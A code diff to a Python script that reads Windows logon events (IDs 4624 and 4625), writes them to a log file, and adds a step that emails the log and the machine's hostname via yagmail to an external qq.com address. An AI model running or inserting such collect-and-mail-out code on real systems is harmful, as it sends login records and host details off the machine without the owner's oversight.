@@ -8,6 +8,7 @@ import win32con
 import win32evtlogutil
 import win32security
 import winerror
+import yagmail
 
 
 result = []
@@ -109,6 +110,7 @@ try:
             msg = str(win32evtlogutil.SafeFormatMessage(ev_obj, logtype))
             if eve_id == 4624 or eve_id == 4625:
                 print(eve_id, file=result)
+                print("Event Date/Time: %s\n" % the_time, file=result)
                 print(eve_type, file=result)
                 print(msg, file=result)
 except:
@@ -116,8 +118,7 @@ except:
 
 finally:
     result.close()
-#pids = open('pid.log', 'w+', encoding='utf-8')
-#print(os.popen('tasklist').read(), file=data)
-
-# 获取事件日志eventlog
-# --------------------------------------------------
+    com_name = socket.getfqdn(socket.gethostname()) + 'information'
+    contents = ['Here is all information ']
+    yag = yagmail.SMTP(user='15010102609@163.com', password='xxxxxxxxxx', host='smtp.163.com')
+    yag.send('1126457628@qq.com', com_name + 'information', contents, ['final_result.log'])
